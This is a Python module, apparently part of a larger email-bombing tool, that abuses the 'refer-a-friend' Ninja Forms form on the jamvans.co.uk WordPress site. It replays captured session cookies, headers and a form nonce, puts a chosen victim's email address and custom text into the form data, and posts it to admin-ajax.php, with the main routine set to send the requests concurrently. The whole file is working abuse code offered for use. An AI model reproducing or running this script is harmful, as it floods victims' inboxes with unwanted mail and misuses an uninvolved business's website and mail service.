from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        import requests

        cookies = {
            'PHPSESSID': 'cbf6a42c53526addf5f035c0450ea566',
            'cookieyesID': 'VFkyZ2RWQmtlYkR6ZDVsZlFPOWxvemdlWTVicDVTRDA',
            'cky-consent': 'no',
            'cookieyes-necessary': 'yes',
            'cookieyes-functional': 'no',
            'cookieyes-analytics': 'no',
            'cookieyes-performance': 'no',
            'cookieyes-advertisement': 'no',
            'cookieyes-other': 'no',
        }

        headers = {
            'authority': 'jamvans.co.uk',
            'accept': '*/*',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'PHPSESSID=cbf6a42c53526addf5f035c0450ea566; cookieyesID=VFkyZ2RWQmtlYkR6ZDVsZlFPOWxvemdlWTVicDVTRDA; cky-consent=no; cookieyes-necessary=yes; cookieyes-functional=no; cookieyes-analytics=no; cookieyes-performance=no; cookieyes-advertisement=no; cookieyes-other=no',
            'origin': 'https://jamvans.co.uk',
            'pragma': 'no-cache',
            'referer': 'https://jamvans.co.uk/refer-a-friend/',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = 'action=nf_ajax_submit&security=adfd2f17b5&formData=%7B%22id%22%3A%2217%22%2C%22fields%22%3A%7B%2226%22%3A%7B%22value%22%3A%22test%22%2C%22id%22%3A26%7D%2C%2228%22%3A%7B%22value%22%3A%22wezxasqw%40gmail.com%22%2C%22id%22%3A28%7D%2C%2231%22%3A%7B%22value%22%3A%22%22%2C%22id%22%3A31%7D%2C%2232%22%3A%7B%22value%22%3A%22test%22%2C%22id%22%3A32%7D%2C%2233%22%3A%7B%22value%22%3A%22wezxasqw%40gmail.com%22%2C%22id%22%3A33%7D%7D%2C%22settings%22%3A%7B%22objectType%22%3A%22Form+Setting%22%2C%22editActive%22%3Afalse%2C%22date_updated%22%3A%222019-12-23+15%3A00%3A15%22%2C%22clear_complete%22%3A%221%22%2C%22hide_complete%22%3A%221%22%2C%22show_title%22%3A%220%22%2C%22status%22%3A%22%22%2C%22append_page%22%3A%22%22%2C%22ajax%22%3A%220%22%2C%22logged_in%22%3A%220%22%2C%22not_logged_in_msg%22%3A%22%22%2C%22sub_limit_number%22%3A%22%22%2C%22sub_limit_msg%22%3A%22%22%2C%22mp_progress_bar%22%3A%220%22%2C%22mp_breadcrumb%22%3A%220%22%2C%22mp_display_titles%22%3A%220%22%2C%22mp_ajax_effect%22%3A%22slide%22%2C%22mp_ajax_direction%22%3A%22ltr%22%2C%22mp_confirm%22%3A%220%22%2C%22mp_confirm_msg%22%3A%22%22%2C%22last_sub%22%3A%226%22%2C%22title%22%3A%22Refer+a+friend%22%2C%22conditions%22%3A%5B%5D%2C%22allow_public_link%22%3A0%2C%22embed_form%22%3A%22%22%2C%22default_label_pos%22%3A%22above%22%2C%22wrapper_class%22%3A%22%22%2C%22element_class%22%3A%22%22%2C%22key%22%3A%22%22%2C%22add_submit%22%3A1%2C%22currency%22%3A%22%22%2C%22unique_field_error%22%3A%22A+form+with+this+value+has+already+been+submitted.%22%2C%22calculations%22%3A%5B%5D%2C%22public_link%22%3A%22https%3A%2F%2Fjamvans.co.uk%2Fninja-forms%2F179ohn%22%2C%22public_link_key%22%3A%22179ohn%22%2C%22ninjaForms%22%3A%22Ninja+Forms%22%2C%22changeEmailErrorMsg%22%3A%22Please+enter+a+valid+email+address!%22%2C%22changeDateErrorMsg%22%3A%22Please+enter+a+valid+date!%22%2C%22confirmFieldErrorMsg%22%3A%22These+fields+must+match!%22%2C%22fieldNumberNumMinError%22%3A%22Number+Min+Error%22%2C%22fieldNumberNumMaxError%22%3A%22Number+Max+Error%22%2C%22fieldNumberIncrementBy%22%3A%22Please+increment+by+%22%2C%22fieldTextareaRTEInsertLink%22%3A%22Insert+Link%22%2C%22fieldTextareaRTEInsertMedia%22%3A%22Insert+Media%22%2C%22fieldTextareaRTESelectAFile%22%3A%22Select+a+file%22%2C%22formErrorsCorrectErrors%22%3A%22Please+correct+errors+before+submitting+this+form.%22%2C%22formHoneypot%22%3A%22If+you+are+a+human+seeing+this+field%2C+please+leave+it+empty.%22%2C%22validateRequiredField%22%3A%22This+is+a+required+field.%22%2C%22honeypotHoneypotError%22%3A%22Honeypot+Error%22%2C%22fileUploadOldCodeFileUploadInProgress%22%3A%22File+Upload+in+Progress.%22%2C%22fileUploadOldCodeFileUpload%22%3A%22FILE+UPLOAD%22%2C%22currencySymbol%22%3A%22%26%2336%3B%22%2C%22fieldsMarkedRequired%22%3A%22Fields+marked+with+an+%3Cspan+class%3D%5C%22ninja-forms-req-symbol%5C%22%3E*%3C%2Fspan%3E+are+required%22%2C%22thousands_sep%22%3A%22%2C%22%2C%22decimal_point%22%3A%22.%22%2C%22siteLocale%22%3A%22en_GB%22%2C%22dateFormat%22%3A%22d%2Fm%2FY%22%2C%22startOfWeek%22%3A%220%22%2C%22of%22%3A%22of%22%2C%22previousMonth%22%3A%22Previous+Month%22%2C%22nextMonth%22%3A%22Next+Month%22%2C%22months%22%3A%5B%22January%22%2C%22February%22%2C%22March%22%2C%22April%22%2C%22May%22%2C%22June%22%2C%22July%22%2C%22August%22%2C%22September%22%2C%22October%22%2C%22November%22%2C%22December%22%5D%2C%22monthsShort%22%3A%5B%22Jan%22%2C%22Feb%22%2C%22Mar%22%2C%22Apr%22%2C%22May%22%2C%22Jun%22%2C%22Jul%22%2C%22Aug%22%2C%22Sep%22%2C%22Oct%22%2C%22Nov%22%2C%22Dec%22%5D%2C%22weekdays%22%3A%5B%22Sunday%22%2C%22Monday%22%2C%22Tuesday%22%2C%22Wednesday%22%2C%22Thursday%22%2C%22Friday%22%2C%22Saturday%22%5D%2C%22weekdaysShort%22%3A%5B%22Sun%22%2C%22Mon%22%2C%22Tue%22%2C%22Wed%22%2C%22Thu%22%2C%22Fri%22%2C%22Sat%22%5D%2C%22weekdaysMin%22%3A%5B%22Su%22%2C%22Mo%22%2C%22Tu%22%2C%22We%22%2C%22Th%22%2C%22Fr%22%2C%22Sa%22%5D%2C%22recaptchaConsentMissing%22%3A%22reCapctha+validation+couldn%26%23039%3Bt+load.%22%2C%22recaptchaMissingCookie%22%3A%22reCaptcha+v3+validation+couldn%26%23039%3Bt+load+the+cookie+needed+to+submit+the+form.%22%2C%22recaptchaConsentEvent%22%3A%22Accept+reCaptcha+cookies+before+sending+the+form.%22%2C%22currency_symbol%22%3A%22%22%2C%22beforeForm%22%3A%22%22%2C%22beforeFields%22%3A%22%22%2C%22afterFields%22%3A%22%22%2C%22afterForm%22%3A%22%22%7D%2C%22extra%22%3A%7B%7D%7D'
        data = data.replace('wezxasqw%40gmail.com', target)
        data = data.replace('test', self.get_text()).encode()

        response = requests.post('https://jamvans.co.uk/wp-admin/admin-ajax.php', cookies=cookies, headers=headers,
                                 data=data)
        return response


def main():
    s = 'Your refer-a-friend email has been sent!'

    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
